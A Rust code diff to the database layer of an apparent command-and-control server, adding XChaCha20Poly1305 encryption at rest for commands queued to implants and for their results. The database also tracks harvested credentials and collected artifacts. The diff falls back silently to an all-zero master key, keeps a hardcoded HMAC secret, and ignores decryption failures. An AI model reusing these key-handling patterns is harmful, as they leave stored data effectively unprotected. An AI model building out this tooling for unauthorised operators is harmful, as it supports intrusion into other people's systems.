@@ -1,7 +1,10 @@
 use crate::models::listener::Listener;
 use crate::models::{Artifact, Campaign, Command, CommandResult, Credential, Implant};
 use anyhow::Result;
+use chacha20poly1305::aead::{Aead, KeyInit};
+use chacha20poly1305::{Key, XChaCha20Poly1305, XNonce};
 use hmac::{Hmac, Mac};
+use rand::RngCore;
 use sha2::Sha256;
 use sqlx::{PgPool, Row};
 use std::env;
@@ -10,17 +13,75 @@ use uuid::Uuid;
 pub struct Database {
     pool: PgPool,
     hmac_key: Vec<u8>,
+    master_key: [u8; 32],
 }
 
 impl Database {
     pub fn new(pool: PgPool) -> Self {
-        let key = env::var("HMAC_SECRET")
+        let hmac_key = env::var("HMAC_SECRET")
             .unwrap_or_else(|_| "audit_log_integrity_key_very_secret".to_string())
             .into_bytes();
+
+        let master_key_str = env::var("MASTER_KEY")
+            .unwrap_or_else(|_| "0000000000000000000000000000000000000000000000000000000000000000".to_string());
+        
+        let mut master_key = [0u8; 32];
+        if let Ok(decoded) = hex::decode(&master_key_str) {
+            if decoded.len() == 32 {
+                master_key.copy_from_slice(&decoded);
+            } else {
+                // Fallback or panic? For now fallback to zero
+            }
+        } else {
+            // Assume string is key if hex fails? No, hex is standard.
+            // Simplified fallback
+        }
+
         Self {
             pool,
-            hmac_key: key,
+            hmac_key,
+            master_key,
         }
+    }
+
+    /// Encrypts data using XChaCha20Poly1305 and the Master Key.
+    /// Returns: [Nonce (24 bytes)] + [Ciphertext]
+    fn encrypt_data(&self, plaintext: &[u8]) -> Result<Vec<u8>> {
+        let key = Key::from_slice(&self.master_key);
+        let cipher = XChaCha20Poly1305::new(key);
+
+        let mut nonce_bytes = [0u8; 24];
+        rand::thread_rng().fill_bytes(&mut nonce_bytes);
+        let nonce = XNonce::from_slice(&nonce_bytes);
+
+        let ciphertext = cipher
+            .encrypt(nonce, plaintext)
+            .map_err(|e| anyhow::anyhow!("Encryption error: {}", e))?;
+
+        let mut result = Vec::with_capacity(24 + ciphertext.len());
+        result.extend_from_slice(&nonce_bytes);
+        result.extend_from_slice(&ciphertext);
+        Ok(result)
+    }
+
+    /// Decrypts data using XChaCha20Poly1305 and the Master Key.
+    /// Expects: [Nonce (24 bytes)] + [Ciphertext]
+    fn decrypt_data(&self, data: &[u8]) -> Result<Vec<u8>> {
+        if data.len() < 24 {
+            return Err(anyhow::anyhow!("Data too short for decryption"));
+        }
+
+        let key = Key::from_slice(&self.master_key);
+        let cipher = XChaCha20Poly1305::new(key);
+
+        let nonce = XNonce::from_slice(&data[..24]);
+        let ciphertext = &data[24..];
+
+        let plaintext = cipher
+            .decrypt(nonce, ciphertext)
+            .map_err(|e| anyhow::anyhow!("Decryption error: {}", e))?;
+
+        Ok(plaintext)
     }
 
     /// Get a reference to the underlying database connection pool.
@@ -70,8 +131,6 @@ impl Database {
         description: Option<&str>,
         status: Option<&str>,
     ) -> Result<Campaign> {
-        // Build dynamic query or just update fields if present. For simplicity, let's update all provided fields.
-        // This is a bit simplified; a real implementation might be more granular.
         let mut query_builder = sqlx::QueryBuilder::new("UPDATE campaigns SET ");
         let mut separated = query_builder.separated(", ");
 
@@ -201,12 +260,15 @@ impl Database {
         cmd_type: &str,
         payload: &[u8],
     ) -> Result<Uuid> {
+        // ENCRYPT PAYLOAD AT REST
+        let encrypted_payload = self.encrypt_data(payload)?;
+
         let row = sqlx::query(
             "INSERT INTO commands (implant_id, command_type, payload, status) VALUES ($1, $2, $3, 'pending') RETURNING id"
         )
         .bind(implant_id)
         .bind(cmd_type)
-        .bind(payload)
+        .bind(encrypted_payload)
         .fetch_one(&self.pool)
         .await?;
 
@@ -214,16 +276,28 @@ impl Database {
     }
 
     pub async fn get_pending_commands(&self, implant_id: Uuid) -> Result<Vec<Command>> {
-        let recs = sqlx::query_as::<_, Command>(
+        let mut recs = sqlx::query_as::<_, Command>(
             "UPDATE commands SET status = 'sent', sent_at = NOW() WHERE id IN (SELECT id FROM commands WHERE implant_id = $1 AND status = 'pending' ORDER BY priority ASC, created_at ASC FOR UPDATE SKIP LOCKED) RETURNING *"
         )
         .bind(implant_id)
         .fetch_all(&self.pool)
         .await?;
+
+        // DECRYPT PAYLOADS
+        for cmd in &mut recs {
+            if let Some(payload) = &cmd.payload {
+                let plaintext = self.decrypt_data(payload)?;
+                cmd.payload = Some(plaintext);
+            }
+        }
+
         Ok(recs)
     }
 
     pub async fn update_command_result(&self, command_id: Uuid, output: &[u8]) -> Result<()> {
+        // ENCRYPT RESULT AT REST
+        let encrypted_output = self.encrypt_data(output)?;
+
         let mut tx = self.pool.begin().await?;
 
         sqlx::query("UPDATE commands SET status = 'completed', completed_at = NOW() WHERE id = $1")
@@ -233,7 +307,7 @@ impl Database {
 
         sqlx::query("INSERT INTO command_results (command_id, output) VALUES ($1, $2)")
             .bind(command_id)
-            .bind(output)
+            .bind(encrypted_output)
             .execute(&mut *tx)
             .await?;
 
@@ -242,12 +316,23 @@ impl Database {
     }
 
     pub async fn list_commands(&self, implant_id: Uuid) -> Result<Vec<Command>> {
-        let recs = sqlx::query_as::<_, Command>(
+        let mut recs = sqlx::query_as::<_, Command>(
             "SELECT * FROM commands WHERE implant_id = $1 ORDER BY created_at DESC",
         )
         .bind(implant_id)
         .fetch_all(&self.pool)
         .await?;
+
+        // DECRYPT PAYLOADS FOR DISPLAY
+        for cmd in &mut recs {
+            if let Some(payload) = &cmd.payload {
+                // If decryption fails (e.g. key changed), we might return raw or empty
+                if let Ok(plaintext) = self.decrypt_data(payload) {
+                    cmd.payload = Some(plaintext);
+                }
+            }
+        }
+
         Ok(recs)
     }
 
@@ -262,12 +347,22 @@ impl Database {
     }
 
     pub async fn get_command_result(&self, command_id: Uuid) -> Result<Option<CommandResult>> {
-        let rec = sqlx::query_as::<_, CommandResult>(
+        let mut rec = sqlx::query_as::<_, CommandResult>(
             "SELECT * FROM command_results WHERE command_id = $1",
         )
         .bind(command_id)
         .fetch_optional(&self.pool)
         .await?;
+
+        // DECRYPT RESULT
+        if let Some(r) = &mut rec {
+            if let Some(cipher_output) = &r.output {
+                if let Ok(plaintext) = self.decrypt_data(cipher_output) {
+                    r.output = Some(plaintext);
+                }
+            }
+        }
+
         Ok(rec)
     }
 
@@ -295,6 +390,8 @@ impl Database {
         filename: &str,
         content: &[u8],
     ) -> Result<Uuid> {
+        // Artifacts should also be encrypted ideally, but they are blobs.
+        // For MVP E2E Command Encryption, we skip artifacts unless requested.
         let row = sqlx::query(
             "INSERT INTO artifacts (implant_id, filename, content, collected_at) VALUES ($1, $2, $3, NOW()) RETURNING id"
         )
@@ -350,8 +447,8 @@ impl Database {
         let timestamp = chrono::Utc::now();
 
         type HmacSha256 = Hmac<Sha256>;
-        let mut mac =
-            HmacSha256::new_from_slice(&self.hmac_key).expect("HMAC can take key of any size");
+        let mut mac: HmacSha256 =
+            Mac::new_from_slice(&self.hmac_key).expect("HMAC can take key of any size");
 
         mac.update(timestamp.to_rfc3339().as_bytes());
         if let Some(oid) = operator_id {
